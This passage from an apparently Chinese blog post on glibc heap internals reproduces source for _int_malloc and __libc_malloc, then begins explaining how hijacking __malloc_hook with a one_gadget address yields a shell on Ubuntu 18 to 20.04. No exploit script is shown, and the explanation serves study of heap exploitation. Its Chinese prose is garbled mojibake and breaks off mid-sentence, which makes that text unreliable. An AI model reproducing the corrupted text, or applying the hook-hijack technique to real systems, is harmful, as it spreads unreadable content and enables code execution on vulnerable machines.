!= victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">         bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">         (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">         that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//__libc_malloc</span></span><br><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//malloc ç›¸å…³å®å®šä¹‰</span></span><br><span class="line"><span class="comment">/*ç”³è¯·çš„å †å—å¯¹é½çš„å®å®šä¹‰*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)</span></span><br><span class="line"><span class="comment">/* This is the correct definition when there is no past ABI to constrain it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Among configurations with a past ABI constraint, it differs from</span></span><br><span class="line"><span class="comment">   2*SIZE_SZ only on powerpc32.  For the time being, changing this is</span></span><br><span class="line"><span class="comment">   causing more compatibility problems due to malloc_get_state and</span></span><br><span class="line"><span class="comment">   malloc_set_state than will returning blocks not adequately aligned for</span></span><br><span class="line"><span class="comment">   long double objects under -mlong-double-128.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span></span><br><span class="line"><span class="meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure><h3 id="malloc-hookå‡½æ•°è§£æ"><a href="#malloc-hookå‡½æ•°è§£æ" class="headerlink" title="malloc_hookå‡½æ•°è§£æ"></a>malloc_hookå‡½æ•°è§£æ</h3><p>malloc_hookæ˜¯mallocçš„é’©å­å‡½æ•°ï¼Œåœ¨æ‰§è¡Œmallocæ—¶ï¼Œä¼šå…ˆæ£€æµ‹__malloc_hookçš„å€¼ï¼Œå¦‚æœmalloc_hookçš„å€¼å­˜åœ¨ï¼Œåˆ™æ‰§è¡Œè¯¥åœ°å€ï¼ˆå€¼é‡Œè¾¹è¡¨ç°ä¸ºåå…­è¿›åˆ¶ï¼Œå¯ä»¥æˆä¸ºåœ°å€ï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬æˆåŠŸåŠ«æŒmalloc_hookä»¥åå¹¶ä¿®æ”¹å®ƒçš„å€¼ä¸ºone_gadgetï¼Œæˆ‘ä»¬å°±èƒ½getshell<br>å¹¶ä¸”åœ¨åŠ å…¥tcacheä¹‹åï¼Œä¸ä¼šå¯¹å¤§å°è¿›è¡Œæ£€æµ‹ï¼Œä½¿æˆ‘ä»¬æ›´å¥½åˆ©ç”¨å®ƒ</p><h3 id="åˆ©ç”¨èŒƒå›´"><a href="#åˆ©ç”¨èŒƒå›´" class="headerlink" title="åˆ©ç”¨èŒƒå›´"></a>åˆ©ç”¨èŒƒå›´</h3><p><strong>ç‰ˆæœ¬:Ubuntu18ï¼ˆåŠ å…¥äº†tcacheï¼Œæ— éœ€ä¼ªé€ sizeï¼‰â€”Ubuntu20.04</strong><br>å› ä¸º<strong>22.04åˆ å»äº†å‡ ä¹æ‰€æœ‰çš„é’©å­å‡½æ•°</strong>ï¼Œä½¿å¾—åŠ«æŒhookæˆä¸ºäº†ä¸å¯èƒ½ï¼Œæ‰€ä»¥å®ƒçš„è¯•ç”¨èŒƒå›´ä»…é™äº20.04ä¹‹å‰ï¼Œåœ¨æœªæ¥åº”è¯¥ä¼šé”€å£°åŒ¿è¿¹</p><p>å®ƒåœ¨å­¦å †ä¹‹åä¼°è®¡å°±æ˜¯æˆ‘ä»¬çš„è€æœ‹å‹çš„ï¼Œæˆ‘ä»¬<strong>å¸¸å¸¸èƒ½åœ¨å 